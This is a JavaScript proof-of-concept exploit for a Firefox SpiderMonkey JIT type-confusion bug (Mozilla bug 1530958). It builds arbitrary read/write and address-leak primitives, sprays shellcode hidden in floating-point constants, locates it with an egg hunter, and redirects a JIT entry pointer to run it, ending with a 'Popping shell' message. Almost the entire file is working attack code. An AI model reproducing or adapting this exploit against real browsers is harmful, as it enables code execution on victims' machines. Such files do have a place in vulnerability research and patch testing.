// Bug reference https://bugzilla.mozilla.org/show_bug.cgi?id=1530958
// Tested with gecko-dev commit: dbddac86aadf1d4871fb350bbe66db43728a9f81

load("utils.js");
load("int64.js");

var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { 
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

// These objects sit adaycent in V8's heap in consecutive order
let victim = new Float64Array(0x1000);
let target1 = new Array(1, 2, 3, 4, 5)
let target2 = new Uint8Array(8);
let ab = new ArrayBuffer(0x1000);

// Based from initial PoC: reference; https://bugzilla.mozilla.org/show_bug.cgi?id=1530958
function weak_write() {
	function trigger_tc1(val, l, trigger) {
		// In the final invocation confuse these two objects which each other.
		// x will (eventually) be an UnboxedObject
		let x = {
			slots: 		13.37, 
			elements: 	13.38, 
			buffer: 	ab, 
			length: 	13.39, 
			byteOffset: 	13.40, 
			data: 		[]
		};

		// y is a real ArrayBufferView object.
		let y = new Float64Array(0x1000);

		// * Trigger a conversion of |this| to a NativeObject.
		// * Update trigger_tc template type to NativeObject with .a and .x (and potentially .y)
		// * Trigger the "roll back" of |this| to a NativeObject with only property .a
		// * Bailout of the JITed code due to type inference changes
		this.a = val;

		// Trigger JIT compilation and OSR entry here. During compilation, IonMonkey will
		// incorrectly assume that |this| already has the final type (so already has property .x)
		for (let i = 0; i < l; i++) {}

		// The JITed code will now only have a property store here and won't update the Shape.
		this.x = x;

		if (trigger) {
		    // This property definition is conditional (and rarely used) so that an inline cache
		    // will be emitted for it, which will inspect the Shape of |this|. As such, .y will
		    // be put into the same slot as .x, as the Shape of |this| only shows property .a.
		    this.y = y;

		    // At this point, .x and .y overlap, and the JITed code below believes that the slot
		    // for .x still stores the UnboxedObject while in reality it now stores a Float64Array.
		}

		// This assignment will then corrupt the data pointer of the Float64Array to point to |victim|.
		this.x.data = victim;
	}

	for (let i = 0; i < 1000; i++) {
		new trigger_tc1(1337, 1, false);
	}

	let a = new trigger_tc1("aaa", 1000000, true);
	return a.y;
}

function weak_read(obj) {
	function trigger_tc(obj, l, trigger) {
		let x = {
			slots: 		13.37, 
			elements: 	13.38, 
			buffer: 	ab, 
			length: 	13.39, 
			byteOffset: 	13.40, 
			data: 		[]
		};

		let y = new Float64Array(0x1000);
		this.a = obj;

		for (let i = 0; i < l; i++) {}
		
		this.x = x;
		
		if (trigger) {
			this.y = obj;
		}
		this.x.data = victim;
	}

	for (let i = 0; i < 1000; i++) {
		new trigger_tc(1337, 1, false);
	}

	let a = new trigger_tc(obj, 1000000, true);
	return a.y;
}

// Triggering first JIT type-confussion to gain an arbitrary write primitive
// driver is now a Float64Array whose data pointer points to victim, also a typed Float64Array.
let driver = new weak_write();

function arb_write(dest, val) {
	driver[7] = dest;	// victim Float64Array data pointer overwrite
	victim[0] = val;	// victim  Float64Array data pointer dereference
}

// Triggering second JIT type-confussion to leak the address of victim Float64Array.
let test = [];
let obj_arr = [test, test]
let leak = new weak_read(obj_arr)

console.log("[+] Leaked Float64Array : 0x" + ftoi(leak[1]).toString(16));
console.log("[+] Overwritting size of Float64Array");

// Addrof primitve based on tampered target1 tagged Array
// and target2 Uint8Array
function addrof(obj) {
	// Changing data pointer of target2 typed Uint8Array to point
	// at elelemt 0 of target1 tagged Array
	arb_write(leak[1] + itof(0xd8n), leak[1] + itof(0x70n))

	target1[0] = obj;
	return target2.slice(0, 8);
}

function arb_read(addr, len) {
	// Changing data pointer of target2 typed Uint8Array to
	// an arbitrary non-tagged address
	arb_write(leak[1] + itof(0xd8n), addr);

	return target2.slice(0, len);
}

function shellcode(){
	find_me = 5.40900888e-315; // 0x41414141 flag in memory
	A = -6.828527034422786e-229;
	B = 8.568532312320605e+170;
	C = 1.4813365150669252e+248;
	D = -6.032447120847604e-264;
	E = -6.0391189260385385e-264;
	F = 1.0842822352493598e-25;
	G = 9.241363425014362e+44;
	H = 2.2104256869204514e+40;
	I = 2.4929675059396527e+40;
	J = 3.2459699498717e-310;
	K = 1.637926e-318;
}

function egg_hunter(addr) {
	var val;
	while(true) {
		val = arb_read(addr, 4)
		if (val[0] == 0x41 && val[1] == 0x41 && 
			val[2] == 0x41 && val[3] == 0x41) {
			addr = addr + itof(0x8n);
			return addr;
		}
		addr = addr + itof(0x1n);
	}
}

// JIT compiling shellcode function
for(i=0;i<0x10000;i++) shellcode();

// Modifying JITInfo ptr to address of beginning of shellcode
let shellcode_addr = itof(BigInt(Int64.fromJSValue(addrof(shellcode))));
console.log("[+] Shellcode Function address:\t0x" + ftoi(shellcode_addr).toString(16));
let jitinfo_ptr = shellcode_addr + itof(0x30n);
console.log("[+] Shellcode Jitinfo ptr:\t0x" + ftoi(jitinfo_ptr).toString(16));
let jitinfo = itof(BigInt(Int64.fromJSValue(arb_read(jitinfo_ptr, 8))));
console.log("[+] Shellcode Jitinfo:\t\t0x" + ftoi(jitinfo).toString(16));
let jit_func_entry = itof(BigInt(Int64.fromJSValue(arb_read(jitinfo, 8))));
console.log("[+] JIT func entry:\t\t0x" + ftoi(jitinfo).toString(16));
let shellcode_ptr = egg_hunter(jit_func_entry);
console.log("[+] Shellcode ptr: \t\t0x" + ftoi(shellcode_ptr).toString(16));
arb_write(jitinfo, shellcode_ptr);

console.log("[+] Popping shell")
shellcode();
